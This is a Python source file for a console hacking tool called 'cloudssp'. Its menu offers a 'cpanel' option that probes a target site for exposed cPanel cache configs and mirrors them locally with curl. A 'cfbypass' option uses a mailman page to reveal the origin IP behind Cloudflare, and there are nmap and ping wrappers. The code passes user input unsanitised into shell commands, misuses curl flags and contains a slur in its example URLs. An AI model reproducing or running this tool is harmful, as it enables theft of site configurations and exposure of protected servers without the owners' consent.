import sys
import requests 
import colorama
import os
import asyncio
import time
import ctypes
from urllib.parse import urlparse 
from colorama import Fore, Back, Style

clear = lambda : os.system('cls')

def progressbar(it, prefix="", size=60, file=sys.stdout):
    
    clear()
    count = len(it)

    def show(j):
        x = int(size * j / count)
        file.write(
            "%s[%s%s] %i/%i\r" % (prefix, f"{Fore.RED}#{Fore.WHITE}" * x, "." * (size - x), j, count))
        file.flush()

    show(0)
    for i, item in enumerate(it):
        yield item
        show(i + 1)
    file.write("\n")
    file.flush()

for i in progressbar(range(100), "Loading, Please Wait ", 10):
        ctypes.windll.kernel32.SetConsoleTitleW('Loading...')
        time.sleep(0.02)

clear()

home = f"""
    {Fore.RED}   ___   __                 _               
    {Fore.GREEN}  / __\ / /  ___  _   _  __| |___ ___ _ __  
    {Fore.RED} / /   / /  / _ \| | | |/ _` / __/ __| '_ \ 
    {Fore.GREEN}/ /___/ /__| (_) | |_| | (_| \__ \__ \ |_) |
    {Fore.RED}\____/\____/\___/ \__,_|\__,_|___/___/ .__/ 
                                         {Fore.GREEN}|_|    
                | {Fore.WHITE}Remade By Charge {Fore.GREEN}| 

{Fore.GREEN}[cloudssp]{Fore.WHITE} Enter Option (e.g - nmap/cfbypass/cpanel/ping)
"""

def Menu(home):
    ctypes.windll.kernel32.SetConsoleTitleW('Home')
    print(home)
    option = input(f">{Fore.RED} ")
    if option == "nmap":
        nmap()
    elif option == "cfbypass":
        ight()
    elif option == "ping":
        ping()
    elif option == "cpanel":
        exploits()
    else:
        clear()
        Menu(home)


    
def banner():
    r = f"{Fore.RED}"
    g = f"{Fore.GREEN}"
    w = f"{Fore.WHITE}"
    print(f"""
                        
    
    {Fore.RED}   ___   __                 _               
    {Fore.GREEN}  / __\ / /  ___  _   _  __| |___ ___ _ __  
    {Fore.RED}  / /   / /  / _ \| | | |/ _` / __/ __| '_ \ 
    {Fore.GREEN}/ /___/ /__| (_) | |_| | (_| \__ \__ \ |_) |
    {Fore.RED}\____/\____/\___/ \__,_|\__,_|___/___/ .__/ 
                                         {Fore.GREEN}|_|    
                | {Fore.WHITE}Remade By Charge {Fore.GREEN}| 
        """)

            
            
def exploits():
    
    
    clear()
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    print(f"{Fore.GREEN}[cloudssp]{Fore.WHITE} Enter Site (e.g - https://retards.lol/)")
    url = inputs = input(f">{Fore.GREEN} ")

    x = requests.get(url+'//.cpanel/caches/config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if x.status_code == 404:
              
              clear()
              print(f'{Fore.RED}Configs Not found')
              
              leave()
              
              
    else:
            
            clear()
            print(f"{Fore.RED}Found Something Please Wait...")
            os.system("curl --execute='robots = off' --mirror --convert-links --no-parent --wait=1 "+inputs+"/.cpanel/caches/config/" + ">/dev/null 2>&1")
            print(f"{Fore.GREEN}Found CPanel Configs! \n{Fore.RED}Check Current Dirrectory \n\n{Fore.WHITE}Checking For backend...")
            leave()
    


    


def ight():
    
    
    
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    clear()
    print(f"{Fore.GREEN}[cloudssp]{Fore.WHITE} Enter Site (e.g - https://retards.lol/)")
    url = inputs = input(f">{Fore.GREEN} ")

    x = requests.get(url+'//mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    
    if x.status_code == 404:
              
              
              print(f'{Fore.RED}Seems like this site is not vulnerable.')
              leave()
    else:
          
          
          arg = inputs
          with requests.get(arg, stream=True) as rsp:
                ip, port = rsp.raw._connection.sock.getpeername()
                
                clear()
                print(f"{Fore.GREEN}Url: " + arg)
                print(f"{Fore.RED}Protected ip: " + ip)
                print(f"{Fore.RED}Protected port:",port)
                print(w + f"\n{Fore.RED}Backend : " + g)
                print(f"{Fore.GREEN}",)
    
                os.system(f"curl "+inputs+"/mailman/listinfo/mailman -s | findstr POST")
                leave()
                
                
          
      
def leave():
    print(f"{Fore.GREEN}[cloudssp]{Fore.WHITE} Type home to return home!{Fore.GREEN} ")
    returnopt = input("> ")
    if returnopt == "home":
        clear()
        Menu(home)
    elif returnopt == "q":
        clear()
        Menu(home)
    else:
        clear()
        print("Invalid Option")
        leave()

def ping():
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW('Ping')
    print(f"{Fore.GREEN}[cloudssp]{Fore.WHITE} Enter website/ip (e.g - https://retards.lol/1.1.1.1)")
    ip = inputs = input(f">{Fore.YELLOW} ")
    os.system("ping "+inputs+"")
    leave()

def nmap():
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW('Nmap')
    print(f"{Fore.GREEN}[cloudssp]{Fore.WHITE} Enter Option (e.g - 1.1.1.1)")
    ip = inputs = input(f">{Fore.GREEN} ")

    os.system("nmap "+inputs+"")
    leave()

Menu(home)


ight()
